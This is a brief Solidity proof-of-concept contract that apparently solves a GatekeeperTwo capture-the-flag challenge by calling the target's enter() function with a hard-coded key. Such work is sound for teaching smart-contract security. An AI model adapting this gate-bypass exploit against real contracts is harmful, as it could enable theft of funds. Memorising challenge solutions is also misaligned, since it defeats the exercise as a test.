pragma solidity ^0.8.24;

contract GatekeeperTwoPoc {
    GatekeeperTwo gatekeeperTwo;

    constructor(address _gatekeeperTwo) {
        gatekeeperTwo = GatekeeperTwo(_gatekeeperTwo);
    }

    function exploit() public {
        gatekeeperTwo.enter(bytes8(0x00000001_00001f38));
    }
}